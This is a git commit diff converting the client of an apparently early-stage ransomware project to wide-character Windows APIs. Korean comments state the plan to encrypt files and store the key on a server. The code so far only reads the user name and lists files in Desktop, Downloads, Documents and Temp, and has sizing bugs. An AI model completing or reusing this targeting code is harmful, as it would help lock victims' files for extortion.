7b875f8dae38a133382b47f87a30e7f9275f438a
arock1998 <arock1998@naver.com>
2023-07-17 10:00:01 +0900

    set kor language

---
+++ client/files.c
@@ -0,0 +1,62 @@
+#include "files.h"
+
+
+/**
+ * get user name
+*/
+wchar_t *getUserName() {
+    wchar_t *acUserName = malloc(sizeof(wchar_t*) * 100);
+    memset(acUserName, 0, sizeof(wchar_t*) * 100);
+    DWORD nUserName = sizeof(acUserName);
+    GetUserNameW((LPWSTR)acUserName, &nUserName);
+    return acUserName;
+}
+
+
+/**
+ * directory 불러오기
+*/
+void getDirectoryFileList(wchar_t *dir, wchar_t fileList[100][100] ) {
+
+    WIN32_FIND_DATAW ffd;
+    LARGE_INTEGER filesize;
+    wchar_t szDir[MAX_PATH];
+    HANDLE hFind = INVALID_HANDLE_VALUE;
+    DWORD dwError = 0;
+    int index = 0;
+
+    printf("================================================================================================= \n");
+    printf("                       Target directory is %S                         \n", dir);
+    printf("================================================================================================= \n");
+
+    wcscpy(szDir, dir);
+    wcscat(szDir, L"\\*");
+    printf("[+] %S\n", szDir);
+    hFind = FindFirstFileW(szDir, &ffd);
+    if (INVALID_HANDLE_VALUE == hFind) {
+
+        printf("\n error FindFirstFile \n");
+        exit(0);
+    }
+    do{
+        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            // printf("  %s   <DIR>\n", ffd.cFileName);
+        }
+        else {
+            filesize.LowPart = ffd.nFileSizeLow;
+            filesize.HighPart = ffd.nFileSizeHigh;
+            // printf("  %s   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
+        }
+        wcscpy(fileList[index], ffd.cFileName);
+        index ++;
+        if(index > 100) {
+            break;
+        }
+    } while (FindNextFileW(hFind, &ffd) != 0);
+
+    dwError = GetLastError();
+    if (dwError != ERROR_NO_MORE_FILES) {
+        printf("\n error FindFirstFile\n");
+    }
+    FindClose(hFind);
+}
--- client/main.c
+++ client/main.c
@@ -1,10 +1,9 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
 #include <string.h>
 #include <Windows.h>
-
-#define BUFFER_SIZE 512
-char *getUserName();
-void getDirectoryFileList(char *dirName, char fileList[100][100] );
+#include <locale.h>
+#include "files.h"
 
 // 파일 암호화 한테로 묶어 놓고 키를 서버에 저장해 준다.
 // 서버용 , 클라이언트
@@ -12,161 +11,71 @@ void getDirectoryFileList(char *dirName, char fileList[100][100] );
 // Desktop, Downloads, Documents ...Temp를 한 구조체 안에서 다루도록
 // TODO : 키생성, 암호화
 
-#define DESKTOP_DIR "\\Desktop"
-#define DOWNLOADS_DIR "\\Downloads"
-#define DOCUMENTS_DIR "\\Documents"
-#define APPDATA_DIR "\\AppData\\Local\\Temp"
 
 int main() {
 
-    char dirPrefix[100] = "C:\\Users\\";
-    char *userName = getUserName();
-    strcat(dirPrefix, userName);
+    _wsetlocale(LC_ALL, L"Korean" );
+    wchar_t* dirPrefix; 
+    dirPrefix = (wchar_t*)malloc(sizeof(wchar_t*) * 100); 
+    wcscpy(dirPrefix, L"C:\\Users\\");
+    wchar_t *userName = getUserName();
+    wcscat(dirPrefix, userName);
 
-    char* dir = (char*)calloc(100, sizeof(char));
-    strcat(dir, dirPrefix);
+    wchar_t* dir = (wchar_t*)malloc(sizeof(wchar_t*)*100);
+    memset(dir, 0, sizeof(wchar_t*) * 100);
+    wcscat(dir, dirPrefix);
 
     //[1] Desktop
-    char desktop[100][100];
-    strcat(dir, DESKTOP_DIR);
+    wchar_t desktop[100][100] = { {0,} };
+    wcscat(dir, DESKTOP_DIR);
     getDirectoryFileList(dir, desktop);
     for(int i = 0; i < 100; i++) {
         if(desktop[i][0] == '\0') break;
-        printf("%s\n", desktop[i]);
+        printf("%S\n", desktop[i]);
     }
 
-    dir = (char*)calloc(100, sizeof(char));
-    strcat(dir, dirPrefix);
+    dir = (wchar_t*)calloc(100, sizeof(wchar_t));
+    wcscat(dir, dirPrefix);
     
     // [2]  Downloads
-    char downloads[100][100];
-    strcat(dir, DOWNLOADS_DIR);
+    wchar_t downloads[100][100];
+    wcscat(dir, DOWNLOADS_DIR);
     getDirectoryFileList(dir, downloads);
+    printf("%S\n", downloads[0]);
+    printf("%c\n", downloads[0][0]);
+    printf("%c\n", downloads[0][1]);
+
     for(int i = 0; i < 100; i++) {
         if(downloads[i][0] == '\0') break;
-        printf("%s\n", downloads[i]);
+        printf("%S\n", downloads[i]);
     }
 
-    dir = (char*)calloc(100, sizeof(char));
-    strcat(dir, dirPrefix);
+    dir = (wchar_t*)calloc(100, sizeof(wchar_t));
+    wcscat(dir, dirPrefix);
 
     // [3]  Documents
-    char documents[100][100];
-    strcat(dir, DOCUMENTS_DIR);
+    wchar_t documents[100][100];
+    wcscat(dir, DOCUMENTS_DIR);
     getDirectoryFileList(dir, documents);
     for(int i = 0; i < 100; i++) {
         if(documents[i][0] == '\0') break;
-        printf("%s\n", documents[i]);
+        printf("%S\n", documents[i]);
     }
 
-    dir = (char*)calloc(100, sizeof(char));
-    strcat(dir, dirPrefix);
+    dir = (wchar_t*)calloc(100, sizeof(wchar_t));
+    wcscat(dir, dirPrefix);
 
     // [4]  AppData/Local/Temp
-    char appData[100][100];
-    strcat(dir, APPDATA_DIR);
+    wchar_t appData[100][100];
+    wcscat(dir, APPDATA_DIR);
     getDirectoryFileList(dir, appData);
     for(int i = 0; i < 100; i++) {
         if(appData[i][0] == '\0') break;
-        printf("%s\n", appData[i]);
+        printf("%S\n", appData[i]);
     }
 
+    free(dirPrefix);
+    free(dir);
 }
 
 
-/**
- * get user name
-*/
-char *getUserName() {
-    char *acUserName = malloc(sizeof(char) * 100);;
-    DWORD nUserName = sizeof(acUserName);
-    GetUserName(acUserName, &nUserName);
-    return acUserName;
-}
-
-
-/**
- * directory 불러오기
-*/
-void getDirectoryFileList(char *dir, char fileList[100][100] ) {
-
-    WIN32_FIND_DATA ffd;
-    LARGE_INTEGER filesize;
-    TCHAR szDir[MAX_PATH];
-    HANDLE hFind = INVALID_HANDLE_VALUE;
-    DWORD dwError = 0;
-    int index = 0;
-
-    printf("================================================================================================= \n");
-    printf("                       Target directory is %s                         \n", dir);
-    printf("================================================================================================= \n");
-
-    strcpy(szDir, dir);
-    strcat(szDir, "\\*");
-    hFind = FindFirstFileA((LPCSTR)szDir, &ffd);
-    if (INVALID_HANDLE_VALUE == hFind) {
-
-        printf("\n error FindFirstFile \n");
-        return;
-    }
-   
-    do{
-        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            // printf("  %s   <DIR>\n", ffd.cFileName);
-        }
-        else {
-            filesize.LowPart = ffd.nFileSizeLow;
-            filesize.HighPart = ffd.nFileSizeHigh;
-            // printf("  %s   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
-        }
-        strcpy(fileList[index], ffd.cFileName);
-        index ++;
-        if(index > 100) {
-            break;
-        }
-    } while (FindNextFile(hFind, &ffd) != 0);
-
-    dwError = GetLastError();
-    if (dwError != ERROR_NO_MORE_FILES) {
-        printf("\n error FindFirstFile\n");
-    }
-    FindClose(hFind);
-
-}
-
-
-
-// /**
-//  * error box
-// */
-// void DisplayErrorBox(LPTSTR lpszFunction) 
-// { 
-//     // Retrieve the system error message for the last-error code
-
-//     LPVOID lpMsgBuf;
-//     LPVOID lpDisplayBuf;
-//     DWORD dw = GetLastError(); 
-
-//     FormatMessage(
-//         FORMAT_MESSAGE_ALLOCATE_BUFFER | 
-//         FORMAT_MESSAGE_FROM_SYSTEM |
-//         FORMAT_MESSAGE_IGNORE_INSERTS,
-//         NULL,
-//         dw,
-//         MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-//         (LPTSTR) &lpMsgBuf,
-//         0, NULL );
-
-//     // Display the error message and clean up
-
-//     lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT, 
-//         (lstrlen((LPCTSTR)lpMsgBuf)+lstrlen((LPCTSTR)lpszFunction)+40)*sizeof(TCHAR)); 
-//     StringCchPrintf((LPTSTR)lpDisplayBuf, 
-//         LocalSize(lpDisplayBuf) / sizeof(TCHAR),
-//         TEXT("%s failed with error %d: %s"), 
-//         lpszFunction, dw, lpMsgBuf); 
-//     MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK); 
-
-//     LocalFree(lpMsgBuf);
-//     LocalFree(lpDisplayBuf);
-// }
